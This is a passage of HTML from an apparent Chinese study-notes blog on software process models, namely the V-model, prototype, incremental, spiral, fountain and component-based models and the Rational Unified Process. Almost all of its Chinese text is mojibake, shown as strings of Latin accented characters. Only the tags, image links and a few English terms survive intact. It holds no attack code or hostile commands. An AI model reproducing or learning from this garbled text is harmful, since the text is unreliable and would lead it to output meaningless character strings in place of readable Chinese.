äº†å¼€å‘çš„é£é™©</p><p>&#x3D;&#x3D;æ—©æœŸé”™è¯¯å‘ç°æ™š&#x3D;&#x3D;</p><p>æ—©æœŸçš„é”™è¯¯å¯èƒ½è¦ç­‰åˆ°å¼€å‘åæœŸçš„æµ‹è¯•é˜¶æ®µæ‰èƒ½å‘ç°ï¼Œè¿›è€Œå¸¦æ¥ä¸¥é‡çš„åæœ</p><p>&#x3D;&#x3D;ä¸é€‚åº”éœ€æ±‚å˜åŒ–&#x3D;&#x3D;</p><p>ä¸èƒ½ååº”å®é™…çš„å¼€å‘æ–¹å¼ï¼Œè½¯ä»¶å¼€å‘éœ€è¦è¿­ä»£ï¼›æ— æ³•é€‚åº”éœ€æ±‚ä¸æ˜ç¡®çš„éœ€æ±‚çš„å˜åŒ–</p><h4 id="ä½¿ç”¨åœºåˆ"><a href="#ä½¿ç”¨åœºåˆ" class="headerlink" title="ä½¿ç”¨åœºåˆ"></a>ä½¿ç”¨åœºåˆ</h4><ul><li>ç³»ç»Ÿ<strong>éœ€æ±‚æ˜ç¡®ä¸”ç¨³å®š</strong></li><li>æŠ€æœ¯æˆç†Ÿ</li><li>å·¥ç¨‹ç®¡ç†è¾ƒä¸¥æ ¼çš„åœºåˆå¦‚<strong>å†›å·¥ã€èˆªå¤©ã€åŒ»ç–—</strong></li></ul><h3 id="V-æ¨¡å‹-V-model"><a href="#V-æ¨¡å‹-V-model" class="headerlink" title="V-æ¨¡å‹(V-model)"></a>V-æ¨¡å‹(V-model)</h3><p>ç€‘å¸ƒæ¨¡å‹çš„å˜ç§ï¼šæè¿°äº†è´¨é‡ä¿è¯åŠ¨ä½œåŒæ²Ÿé€šã€‚å»ºæ¨¡ç›¸å…³åŠ¨ä½œä»¥åŠæ—©æœŸæ„å»ºç›¸å…³çš„åŠ¨ä½œä¹‹é—´çš„å…³ç³»ã€‚æä¾›äº†ä¸€ç§å°†éªŒè¯å’Œç¡®è®¤åŠ¨ä½œåº”ç”¨äºæ—©æœŸè½¯ä»¶å·¥ç¨‹å·¥ä½œä¸­çš„ç›´è§‚æ–¹æ³•ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103210255909.png" alt="image-20240103210255909" style="zoom: 33%;" /><h3 id="åŸå‹æ¨¡å‹"><a href="#åŸå‹æ¨¡å‹" class="headerlink" title="åŸå‹æ¨¡å‹"></a>åŸå‹æ¨¡å‹</h3><p>ä¹Ÿç§°ä¸ºï¼šåŸå‹åŒ–æ¨¡å‹ã€å¿«é€ŸåŸå‹æ¨¡å‹</p><p>&#x3D;&#x3D;åŸå‹(prototype)&#x3D;&#x3D;</p><ul><li>ä¸€ä¸ªéƒ¨åˆ†å¼€å‘çš„äº§å“ï¼Œä½¿å®¢æˆ·å’Œå¼€å‘äººå‘˜èƒ½å¤Ÿå¯¹è®¡åˆ’å¼€å‘çš„ç³»ç»Ÿçš„ç›¸å…³æ–¹é¢è¿›è¡Œæ£€æŸ¥ã€‚</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103212336863.png" alt="image-20240103212336863" style="zoom: 33%;" /><p>&#x3D;&#x3D;åŸå‹åŒ–ç›®çš„&#x3D;&#x3D;</p><ul><li>æ˜ç¡®å¹¶å®Œå–„éœ€æ±‚ï¼Œå¦‚æ¼”ç¤ºåŸå‹</li><li>ç ”ç©¶æŠ€æœ¯é€‰æ‹©æ–¹æ¡ˆï¼Œå¦‚æŠ€æœ¯éªŒæ”¶åŸå‹</li></ul><p>&#x3D;&#x3D;åŸå‹ç»“æœ&#x3D;&#x3D;</p><ul><li>æŠ›å¼ƒåŸå‹</li><li>æŠŠåŸå‹å‘å±•æˆæœ€ç»ˆäº§å“</li></ul><p>&#x3D;&#x3D;ä¸¾ä¾‹&#x3D;&#x3D;</p><ul><li>å›¾ä¹¦å€Ÿé˜…ç³»ç»Ÿï¼šä¸»è¦ç•Œé¢</li><li>æ™ºèƒ½å®¶å±…ç³»ç»Ÿï¼šå°‘é‡çš„å®¤å†…ä¿¡æ¯ç›‘è§†å’Œç”µå™¨æ§åˆ¶</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103212541026.png" alt="image-20240103212541026" style="zoom: 50%;" /><h4 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><p>å‡å°‘éœ€æ±‚ä¸æ˜ç¡®å¸¦æ¥çš„é£é™©</p><h4 id="ç¼ºç‚¹-1"><a href="#ç¼ºç‚¹-1" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><ul><li>æ„é€ åŸå‹é‡‡ç”¨çš„æŠ€æœ¯å’Œå·¥å…·ä¸ä¸€å®šä¸»æµ</li><li>å¿«é€Ÿå»ºç«‹èµ·æ¥çš„ç³»ç»ŸåŠ ä¸Šè¿ç»­çš„ä¿®æ”¹å¯èƒ½å¯¼è‡´åŸå‹è´¨é‡ä½ä¸‹</li><li>è®¾è®¡è€…åœ¨è´¨é‡å’ŒåŸå‹ä¸­è¿›è¡ŒæŠ˜ä¸­</li><li>å®¢æˆ·æ„è¯†ä¸åˆ°ä¸€äº›è´¨é‡é—®é¢˜</li></ul><h4 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h4><ul><li>å®¢æˆ·å®šä¹‰ä¸€ä¸ªæ€»ä½“ç›®æ ‡é›†ï¼Œä½†æ˜¯å®ƒä»¬<strong>å¹¶ä¸æ¸…æ¥šç³»ç»Ÿçš„å…·ä½“è¾“å…¥è¾“å‡ºï¼›æˆ–å¼€å‘è€…ä¸ç¡®å®šç®—æ³•çš„æ•ˆç‡ã€è½¯ä»¶ä¸æ“ä½œç³»ç»Ÿæ˜¯å¦å…¼å®¹ä»¥åŠå®¢æˆ·ä¸è®¡ç®—æœºäº¤äº’çš„æ–¹å¼</strong></li><li>æ­¤æ—¶ï¼ŒåŸå‹æ¨¡å‹æ˜¯å¾ˆå¥½çš„é€‰æ‹©</li></ul><h3 id="å¢é‡æ¨¡å‹"><a href="#å¢é‡æ¨¡å‹" class="headerlink" title="å¢é‡æ¨¡å‹"></a>å¢é‡æ¨¡å‹</h3><p>å¢é‡ï¼šæ»¡è¶³ç”¨æˆ·éœ€æ±‚çš„ä¸€ä¸ªå­é›†ï¼Œèƒ½å¤Ÿå®Œæˆä¸€å®šåŠŸèƒ½ã€å°è€Œå¯ç”¨çš„è½¯ä»¶</p><h4 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><ul><li><p>æ–‡å­—å¤„ç†è½¯ä»¶ï¼šåˆ›å»ºæ–‡æœ¬ã€ç»„ç»‡æ–‡æœ¬ã€æ ¼å¼åŒ–æ–‡æœ¬</p><p>ç¬¬ä¸€ä¸ªå¢é‡ï¼Œåˆ›å»ºæ–‡æœ¬-&gt;ç¬¬ä¸€ä¸ªå‘å¸ƒï¼šåˆ›å»ºæ–‡æœ¬ï¼›-&gt;ç¬¬äºŒä¸ªå¢é‡ï¼Œç»„ç»‡æ–‡æœ¬-&gt;ç¬¬äºŒä¸ªå‘å¸ƒï¼šåˆ›å»ºæ–‡æœ¬ã€ç»„ç»‡æ–‡æœ¬ã€‚-&gt;ç¬¬ä¸‰ä¸ªå¢é‡Â·Â·Â·Â·Â·Â·</p></li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103213125109.png" alt="image-20240103213125109" style="zoom:50%;" /><h4 id="ç‰¹ç‚¹-1"><a href="#ç‰¹ç‚¹-1" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h4><ul><li>å¢é‡æ¨¡å‹æ˜¯ä¸€ç§<strong>éæ•´ä½“å¼€å‘</strong>çš„æ¨¡å‹ï¼Œæ˜¯ä¸€ç§<strong>è¿›åŒ–å¼</strong>çš„å¼€å‘è¿‡ç¨‹</li><li>å¢é‡æ¨¡å‹ä»éƒ¨åˆ†éœ€æ±‚è§¦å‘ï¼Œå…ˆå»ºç«‹ä¸€ä¸ªä¸å®Œæ•´çš„ç³»ç»Ÿï¼Œé€šè¿‡æµ‹è¯•è¿è¡Œè¿™ä¸ªç³»ç»Ÿå–å¾—ç»éªŒå’Œåé¦ˆï¼Œè¿›ä¸€æ­¥ä½¿ç³»ç»Ÿæ‰©å……å’Œå®Œå–„</li><li>å¦‚æ­¤åå¤ï¼Œç›´åˆ°è½¯ä»¶äººå‘˜å’Œç”¨æˆ·å¯¹è½¯ä»¶ç³»ç»Ÿæ»¡æ„</li><li>å¢é‡æ¨¡å‹ç»“åˆäº†<strong>åŸå‹æ¨¡å‹çš„åŸºæœ¬è¦ç´ å’Œè¿­ä»£çš„ç‰¹å¾</strong>ï¼Œé‡‡ç”¨äº†åŸºäºæ—¶é—´çš„çº¿æ€§åºåˆ—ï¼Œæ¯ä¸ªçº¿æ€§åºåˆ—éƒ½ä¼šè¾“å‡ºè¯¥è½¯ä»¶çš„ä¸€ä¸ªâ€å¢é‡â€</li><li>æ¯ä¸ªå¢é‡çš„å¼€å‘å¯ç”¨ç€‘å¸ƒæˆ–å¿«é€ŸåŸå‹æ¨¡å‹</li></ul><h4 id="ä¼˜ç‚¹-1"><a href="#ä¼˜ç‚¹-1" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><ul><li>å¢é‡æ¦‚å¿µçš„å¼•å…¥ï¼Œä¸éœ€è¦æä¾›å®Œæ•´çš„éœ€æ±‚ï¼Œåªè¦æœ‰ä¸€ä¸ªå¢é‡å‡ºç°ï¼Œå¼€å‘å°±å¯ä»¥è¿›è¡Œ</li><li>è½¯ä»¶èƒ½æ›´æ—©æŠ•å…¥å¸‚åœº</li><li>å¼€æ”¾å¼ä½“ç³»ç»“æ„ï¼Œä¾¿äºç»´æŠ¤</li><li>åœ¨é¡¹ç›®çš„åˆå§‹é˜¶æ®µä¸éœ€è¦æŠ•å…¥å¤ªå¤šçš„äººåŠ›èµ„æº</li><li>äº§å“é€æ­¥äº¤ä»˜ï¼Œè½¯ä»¶å¼€å‘èƒ½å¤Ÿè¾ƒå¥½åœ°é€‚åº”éœ€æ±‚çš„å˜åŒ–</li><li>èƒ½éƒ½çœ‹åˆ°è½¯ä»¶ä¸­é—´äº§å“ï¼Œæå‡ºæ”¹è¿›æ„è§ï¼Œå‡å°‘è¿”å·¥ï¼Œé™ä½å¼€å‘é£é™©</li></ul><h4 id="ç¼ºç‚¹-2"><a href="#ç¼ºç‚¹-2" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><ul><li>æ¯ä¸ªå¢é‡å¿…é¡»æä¾›ä¸€äº›ç³»ç»ŸåŠŸèƒ½ï¼Œè¿™æ˜¯çš„å¼€å‘è€…å¾ˆéš¾æ ¹æ®å®¢æˆ·éœ€æ±‚ç»™å‡ºå¤§å°åˆé€‚çš„å¢é‡</li><li>è½¯ä»¶å¿…é¡»å…·å¤‡å¼€æ”¾å¼ä½“ç³»ç»“æ„(å›°éš¾)</li><li>æ˜“é€€åŒ–æˆè¾¹åšè¾¹æ”¹çš„æ–¹å¼ï¼Œä½¿è½¯ä»¶è¿‡ç¨‹æ§åˆ¶<strong>å¤±å»æ•´ä½“æ€§</strong></li></ul><h4 id="ä½¿ç”¨åœºåˆ-1"><a href="#ä½¿ç”¨åœºåˆ-1" class="headerlink" title="ä½¿ç”¨åœºåˆ"></a>ä½¿ç”¨åœºåˆ</h4><p>é€‚ç”¨äºè½¯ä»¶å¼€å‘ä¸­<strong>éœ€æ±‚å¯èƒ½å‘ç”Ÿå˜åŒ–ã€å…·æœ‰è¾ƒå¤§é£é™©</strong>ã€æˆ–è€…<strong>å¸Œæœ›å°½æ—©è¿›å…¥å¸‚åœº</strong>çš„é¡¹ç›®</p><h3 id="èºæ—‹æ¨¡å‹"><a href="#èºæ—‹æ¨¡å‹" class="headerlink" title="èºæ—‹æ¨¡å‹"></a>èºæ—‹æ¨¡å‹</h3><h4 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h4><ul><li>è½¯ä»¶å¼€å‘æ™®éå­˜åœ¨é£é™©<ul><li>äº¤ä»˜çš„äº§å“ç”¨æˆ·ä¸æ»¡æ„</li><li>äº§å“ä¸èƒ½æŒ‰æ—¶äº¤ä»˜</li><li>å¼€å‘æˆæœ¬è¶…è¿‡é¢„ç®—</li><li>äº§å“å¼€å‘æœŸé—´å…³é”®å¼€å‘äººå‘˜ç¦»èŒ</li><li>äº§å“æŠ•å…¥å¸‚åœºå‰ç«äº‰å¯¹æ‰‹å‘å¸ƒåŠŸèƒ½ç›¸è¿‘ä»·æ ¼æ›´ä½äº§å“</li><li>Â·Â·Â·</li></ul></li></ul><p>æŠŠ<strong>å¼€å‘æ´»åŠ¨</strong>å’Œ<strong>é£é™©ç®¡ç†</strong>ç»“åˆèµ·æ¥æ§åˆ¶é£é™©</p><h4 id="èºæ—‹æ¨¡å‹-1"><a href="#èºæ—‹æ¨¡å‹-1" class="headerlink" title="èºæ—‹æ¨¡å‹"></a>èºæ—‹æ¨¡å‹</h4><ul><li><p>å¼€å‘è¿‡ç¨‹åˆ†ä¸ºè‹¥å¹²æ¬¡è¿­ä»£ï¼Œæ¯æ¬¡è¿­ä»£ä»£è¡¨å¼€å‘çš„ä¸€ä¸ªé˜¶æ®µï¼Œå¯¹åº”æ¨¡å‹ä¸­ä¸€æ¡ç¯çº¿</p></li><li><p>æ¯æ¬¡è¿­ä»£åˆ†æˆå››ä¸ªæ–¹é¢çš„æ´»åŠ¨ï¼Œå¯¹åº”å››ä¸ªè±¡é™</p><ul><li>ç¡®å®šæœ¬é˜¶æ®µç›®æ ‡ï¼Œé€‰å®šå®æ–½æ–¹æ¡ˆï¼Œå¼„æ¸…é¡¹ç›®å¼€å‘çš„é™åˆ¶æ¡ä»¶</li><li>è¯„ä¼°æ‰€é€‰æ–¹æ¡ˆï¼Œé€šè¿‡æ„é€ åŸå‹å’Œé£é™©åˆ†æè¯†åˆ«å’Œæ¶ˆé™¤é£é™©</li><li>å®æ–½è½¯ä»¶å¼€å‘å’ŒéªŒè¯</li><li>è¯„ä»·æœ¬é˜¶æ®µçš„å·¥ä½œæˆæœï¼Œæå‡ºä¿®æ­£å»ºè®®ï¼Œå¹¶è®¡åˆ’ä¸‹ä¸€é˜¶æ®µå·¥ä½œã€‚</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103214420796.png" alt="image-20240103214420796" style="zoom:50%;" /></li></ul><p>æ¨¡å‹ç»“åˆäº†ç€‘å¸ƒæ¨¡å‹å’ŒåŸå‹æ¨¡å‹çš„ç‰¹ç‚¹</p><h4 id="ä¼˜ç‚¹-2"><a href="#ä¼˜ç‚¹-2" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><ul><li>å¼ºè°ƒåŸå‹çš„å¯æ‰©å……æ€§å’Œå¯ä¿®æ”¹æ€§ï¼ŒåŸå‹çš„è¿›åŒ–è´¯ç©¿æ•´ä¸ªè½¯ä»¶ç”Ÿå‘½å‘¨æœŸï¼Œè¿™å°†æœ‰åŠ©äºç›®æ ‡è½¯ä»¶çš„é€‚åº”èƒ½åŠ›ï¼Œæ”¯æŒç”¨æˆ·éœ€æ±‚çš„åŠ¨æ€å˜åŒ–</li><li>åŸå‹å¯çœ‹åšå¯æ‰§è¡Œçš„éœ€æ±‚è§„æ ¼è¯´æ˜ï¼Œæ˜“äºä¸ºç”¨æˆ·å’Œå¼€å‘äººå‘˜å…±åŒç†è§£ï¼Œè¿˜å¯ä»¥ä½œä¸ºç»§ç»­å¼€å‘çš„åŸºç¡€ï¼Œå¹¶ä¸ºç”¨æˆ·å‚ä¸æ‰€æœ‰å…³é”®å†³ç­–æä¾›äº†æ–¹ä¾¿</li><li>èºæ—‹æ¨¡å‹ä¸ºé¡¹ç›®ç®¡ç†äººå‘˜åŠæ—¶è°ƒæ•´ç®¡ç†å†³ç­–æä¾›äº†æ–¹ä¾¿ï¼Œè¿›è€Œå¯é™ä½å¼€å‘é£é™©</li></ul><h4 id="ç¼ºç‚¹-3"><a href="#ç¼ºç‚¹-3" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><ul><li>å¦‚æœæ¯æ¬¡è¿­ä»£çš„æ•ˆç‡ä¸é«˜ï¼Œå°†å¯¼è‡´è¿­ä»£æ¬¡æ•°è¿‡å¤šï¼Œå°†ä¼šå¢åŠ æˆæœ¬å¹¶æ¨è¿Ÿäº¤ä»˜æ—¶é—´</li><li>éœ€è¦æœ‰ç›¸å½“ä¸°å¯Œçš„é£é™©è¯„ä¼°ç»éªŒå’Œä¸“é—¨çŸ¥è¯†ï¼Œè¦æ±‚å¼€å‘é˜Ÿä¼æ°´å¹³è¾ƒé«˜ï¼Œå¦åˆ™ä¼šåˆ°æ¥æ›´å¤§é£é™©ã€‚</li></ul><h4 id="é€‚ç”¨åœºåˆ"><a href="#é€‚ç”¨åœºåˆ" class="headerlink" title="é€‚ç”¨åœºåˆ"></a>é€‚ç”¨åœºåˆ</h4><p>éœ€æ±‚ä¸æ˜ç¡®<strong>å¯èƒ½å‘ç”Ÿå˜</strong>åŒ–çš„<strong>å¤§å‹å¤æ‚</strong>çš„è½¯ä»¶ç³»ç»Ÿ</p><p>æ”¯æŒé¢å‘è¿‡ç¨‹ã€é¢å‘å¯¹è±¡ç­‰å¤šç§è½¯ä»¶å¼€å‘æ–¹æ³•ï¼Œæ˜¯ä¸€ç§å…·æœ‰å¹¿é˜”å‰æ™¯çš„æ¨¡å‹</p><h3 id="å–·æ³‰æ¨¡å‹"><a href="#å–·æ³‰æ¨¡å‹" class="headerlink" title="å–·æ³‰æ¨¡å‹"></a>å–·æ³‰æ¨¡å‹</h3><p>æ˜¯ä¸€ç§ä»¥ç”¨æˆ·éœ€æ±‚ä¸ºåŠ¨åŠ›ï¼Œä»¥å¯¹è±¡ä¸ºé©±åŠ¨çš„æ¨¡å‹ï¼Œä¸»è¦ç”¨äºæè¿°é¢å‘å¯¹è±¡çš„è½¯ä»¶å¼€å‘è¿‡ç¨‹</p><p>è½¯ä»¶å¼€å‘æ—©æœŸå®šä¹‰å¯¹è±¡ï¼Œæ•´ä¸ªå¼€å‘è¿‡ç¨‹å……å®å’Œæ‰©å……å¯¹è±¡</p><p>å„ä¸ªé˜¶æ®µä½¿ç”¨ç»Ÿä¸€çš„æ¦‚å¿µå’Œè¡¨ç¤ºæ–¹æ³•ï¼Œç”Ÿå‘½å‘¨æœŸå„é˜¶æ®µæ— ç¼è¿æ¥</p><p>å„ä¸ªå¼€å‘æ­¥éª¤å¤šæ¬¡åå¤è¿­ä»£</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103215212626.png" alt="image-20240103215212626" style="zoom: 50%;" /><h4 id="ä¼˜ç‚¹-3"><a href="#ä¼˜ç‚¹-3" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><p>å„ä¸ªé˜¶æ®µæœ‰æ˜æ˜¾çš„ç•Œé™ï¼Œå¼€å‘äººå‘˜å¯ä»¥åŒæ­¥è¿›è¡Œå¼€å‘ï¼Œå¯ä»¥æé«˜è½¯ä»¶é¡¹ç›®å¼€å‘æ•ˆç‡ï¼ŒèŠ‚çœå¼€å‘æ—¶é—´ï¼Œé€‚ç”¨äºé¢å‘å¯¹è±¡çš„è½¯ä»¶å¼€å‘è¿‡ç¨‹</p><h4 id="ç¼ºç‚¹-4"><a href="#ç¼ºç‚¹-4" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><p>å–·æ³‰æ¨¡å‹åœ¨å„ä¸ªå¼€å‘é˜¶æ®µæ˜¯é‡å çš„ï¼Œåœ¨å¼€å‘è¿‡ç¨‹æ€»éœ€è¦å¤§é‡çš„å¼€å‘äººå‘˜ï¼Œå› æ­¤ä¸åˆ©äºé¡¹ç›®çš„ç®¡ç†</p><p>å–·æ³‰æ¨¡å‹è¦æ±‚ä¸¥æ ¼ç®¡ç†æ–‡æ¡£ï¼Œä½¿å¾—å®¡æ ¸çš„éš¾åº¦åŠ å¤§ï¼Œå°¤å…¶æ­»é¢å¯¹å¯èƒ½éšæ—¶åŠ å…¥çš„å„ç§ä¿¡æ¯ã€éœ€æ±‚ä¸èµ„æ–™çš„æƒ…å†µ</p><h4 id="é€‚ç”¨åœºåˆ-1"><a href="#é€‚ç”¨åœºåˆ-1" class="headerlink" title="é€‚ç”¨åœºåˆ"></a>é€‚ç”¨åœºåˆ</h4><p><strong>é¢å‘å¯¹è±¡å¼€å‘</strong></p><h2 id="è½¯ä»¶è¿‡ç¨‹æ¨¡å‹çš„é€‰æ‹©"><a href="#è½¯ä»¶è¿‡ç¨‹æ¨¡å‹çš„é€‰æ‹©" class="headerlink" title="è½¯ä»¶è¿‡ç¨‹æ¨¡å‹çš„é€‰æ‹©"></a>è½¯ä»¶è¿‡ç¨‹æ¨¡å‹çš„é€‰æ‹©</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104014606511.png" alt="image-20240104014606511"></p><h2 id="ä¸“ç”¨è¿‡ç¨‹æ¨¡å‹"><a href="#ä¸“ç”¨è¿‡ç¨‹æ¨¡å‹" class="headerlink" title="ä¸“ç”¨è¿‡ç¨‹æ¨¡å‹"></a>ä¸“ç”¨è¿‡ç¨‹æ¨¡å‹</h2><p>ä¸“ç”¨è¿‡ç¨‹æ¨¡å‹å…·æœ‰å‰é¢æåˆ°çš„ä¼ ç»Ÿè¿‡ç¨‹æ¨¡å‹çš„ä¸€äº›ç‰¹ç‚¹ï¼Œä½†æ˜¯ï¼Œä¸“ç”¨è¿‡ç¨‹æ¨¡å‹å¾€å¾€åº”ç”¨è¾ƒçª„ä¸”ä¸“ä¸€ï¼Œåªé€‚ç”¨äºæŸäº›ç‰¹å®šçš„è½¯ä»¶å·¥ç¨‹æ–¹æ³•</p><h3 id="åŸºäºæ„ä»¶çš„å¼€å‘æ¨¡å‹"><a href="#åŸºäºæ„ä»¶çš„å¼€å‘æ¨¡å‹" class="headerlink" title="åŸºäºæ„ä»¶çš„å¼€å‘æ¨¡å‹"></a>åŸºäºæ„ä»¶çš„å¼€å‘æ¨¡å‹</h3><p>Component-bases development modelï¼Œè¿‘å¹´æ¥å¾—åˆ°å¹¿æ³›å…³æ³¨ï¼Œæ”¹å˜å¤§å‹è½¯ä»¶å¼€å‘æ–¹å¼ã€‚</p><p>è€ƒè™‘çš„ç„¦ç‚¹æ˜¯é›†æˆï¼Œè€Œéå®ç°</p><ul><li>æ„ä»¶&#x2F;ç»„ä»¶(Component)<ul><li>ç³»ç»Ÿä¸­æ¨¡å—åŒ–çš„ã€å¯æ›´æ¢çš„éƒ¨åˆ†</li><li>å®ç°ç‰¹å®šçš„åŠŸèƒ½</li><li>å¯¹å®ç°è¿›è¡Œå°è£…ï¼Œæš´éœ²ä¸€ç»„æ¥å£</li><li>ä¾‹å¦‚ï¼šåŠ¨æ€é“¾æ¥åº“(.dll)ï¼Œæµè§ˆå™¨æ’ä»¶</li></ul></li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104004905174.png" alt="image-20240104004905174" style="zoom:50%;" /><h4 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h4><p>&#x3D;&#x3D;éœ€æ±‚åˆ†æ&#x3D;&#x3D;</p><p>ä¸å…¶ä»–è¿‡ç¨‹æ¨¡å‹ç›¸åŒ</p><p>&#x3D;&#x3D;æ„ä»¶åˆ†æ&#x3D;&#x3D;</p><p>æ ¹æ®éœ€æ±‚æœç´¢æ„ä»¶ï¼Œå¦‚æœæ²¡æœ‰å®Œå…¨åŒ¹é…çš„æ„ä»¶ï¼Œåˆ™éœ€è¦ä¿®æ”¹æ„ä»¶æˆ–è€…ä¿®æ”¹éœ€æ±‚</p><p>&#x3D;&#x3D;ç³»ç»Ÿè®¾è®¡&#x3D;&#x3D;</p><p>ä¸å…¶ä»–è¿‡ç¨‹æ¨¡å‹ä¸åŒï¼Œè€ƒè™‘é‡ç”¨å’Œé›†æˆï¼Œå¦‚æœæ²¡æœ‰å¯é‡ç”¨çš„æ„ä»¶ï¼Œåˆ™è®¾è®¡æ–°è½¯ä»¶</p><p>&#x3D;&#x3D;å¼€å‘é›†æˆ&#x3D;&#x3D;</p><ul><li><p>å°†æ„ä»¶é›†æˆåˆ°ç³»ç»Ÿä¸­</p></li><li><p>å¼€å‘æ–°è½¯ä»¶</p></li></ul><h4 id="ä¼˜ç‚¹-4"><a href="#ä¼˜ç‚¹-4" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><ul><li>è½¯ä»¶<strong>å¤ç”¨</strong>æ€æƒ³</li><li>é™ä½å¼€å‘æˆæœ¬å’Œé£é™©ï¼ŒåŠ å¿«å¼€å‘é€Ÿåº¦ï¼Œæé«˜è½¯ä»¶è´¨é‡</li></ul><h4 id="ç¼ºç‚¹-5"><a href="#ç¼ºç‚¹-5" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><ul><li>æ¨¡å‹å¤æ‚</li><li>å•†ä¸šæ„ä»¶ä¸èƒ½ä¿®æ”¹ï¼Œä¼šå¯¼è‡´ä¿®æ”¹éœ€æ±‚ï¼Œè¿›è€Œå¯¼è‡´ç³»ç»Ÿä¸èƒ½å®Œå…¨ç¬¦åˆå®¢æˆ·éœ€æ±‚</li><li>æ— æ³•å®Œå…¨æ§åˆ¶æ‰€å¼€å‘ç³»ç»Ÿçš„æ¼”åŒ–</li><li>é¡¹ç›®åˆ’åˆ†çš„å¥½åç›´æ¥å½±å“é¡¹ç›®ç»“æœçš„å¥½å</li></ul><h4 id="é€‚ç”¨åœºæ™¯"><a href="#é€‚ç”¨åœºæ™¯" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a>é€‚ç”¨åœºæ™¯</h4><p>é€‚ç”¨äº<strong>ç³»ç»Ÿä¹‹é—´æœ‰å…±æ€§</strong>çš„æƒ…å†µ</p><h2 id="ç»Ÿä¸€è¿‡ç¨‹"><a href="#ç»Ÿä¸€è¿‡ç¨‹" class="headerlink" title="ç»Ÿä¸€è¿‡ç¨‹"></a>ç»Ÿä¸€è¿‡ç¨‹</h2><p>æŸç§ç¨‹åº¦ä¸Šï¼Œç»Ÿä¸€è¿‡ç¨‹å°è¯•ç€ä»ä¼ ç»Ÿçš„è½¯ä»¶è¿‡ç¨‹ä¸­æŒ–æ˜æœ€å¥½çš„ç‰¹å¾å’Œæ€§è´¨ï¼Œä½†æ˜¯ä»¥æ•æ·è½¯ä»¶å¼€å‘ä¸­è®¸å¤šæœ€å¥½çš„åŸåˆ™æ¥å®ç°ã€‚</p><p>ç»Ÿä¸€è¿‡ç¨‹è®¤è¯†åˆ°ä¸å®¢æˆ·æ²Ÿé€šä»¥åŠä»ç”¨æˆ·çš„è§’åº¦æè¿°ç³»ç»Ÿ(å³ç”¨ä¾‹)å¹¶ä¿æŒè¯¥æè¿°çš„ä¸€è‡´æ€§çš„é‡è¦æ€§ã€‚å®ƒå¼ºè°ƒè½¯ä»¶ä½“ç³»ç»“æ„çš„é‡è¦ä½œç”¨ï¼Œå¹¶â€œå¸®åŠ©æ¶æ„å¸ˆä¸“æ³¨äºæ­£ç¡®çš„ç›®æ ‡ï¼Œä¾‹å¦‚å¯ç†è§£æ€§ã€å¯¹æœªæ¥å˜æ›´çš„å¯é€‚åº”æ€§ä»¥åŠå¤ç”¨â€ã€‚</p><h3 id="Rational-ç»Ÿä¸€è¿‡ç¨‹æ¨¡å‹"><a href="#Rational-ç»Ÿä¸€è¿‡ç¨‹æ¨¡å‹" class="headerlink" title="Rational ç»Ÿä¸€è¿‡ç¨‹æ¨¡å‹"></a>Rational ç»Ÿä¸€è¿‡ç¨‹æ¨¡å‹</h3><p>Rational Unified Process -RUP</p><p>ç”±Rationalå…¬å¸(ç°å·²è¢«IBMæ”¶è´­)é€€å‡ºçš„å®Œæ•´ä¸”å®Œç¾çš„è½¯ä»¶å·¥ç¨‹æ–¹æ³•ï¼Œè·å¾—å¹¿æ³›ä½¿ç”¨</p><ul><li>åŸºäºé¢å‘å¯¹è±¡æ–¹æ³•å­¦</li><li>ä½¿ç”¨ç»Ÿä¸€å»ºæ¨¡è¯­è¨€UML(Unified Modeling Language)</li></ul><h4 id="è¿‡ç¨‹-1"><a href="#è¿‡ç¨‹-1" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h4><p>ä»ä¸‰ä¸ªè§†è§’æè¿°è½¯ä»¶å¼€å‘è¿‡ç¨‹</p><ul><li>åŠ¨æ€è§†è§’ï¼šéšæ—¶é—´å˜åŒ–çš„å„ä¸ªé˜¶æ®µ</li><li>é™æ€è§†è§’ï¼šæ‰€è¿›è¡Œçš„æ´»åŠ¨</li><li>å®è·µè§†è§’ï¼šå¯é‡‡ç”¨çš„è‰¯å¥½å®è·µå»ºè®®</li></ul><blockquote><p>é€‚åˆå¤§å›¢é˜Ÿï¼Œå¤§é¡¹ç›®</p></blockquote><h4 id="æœ€ä½³å®è·µ"><a href="#æœ€ä½³å®è·µ" class="headerlink" 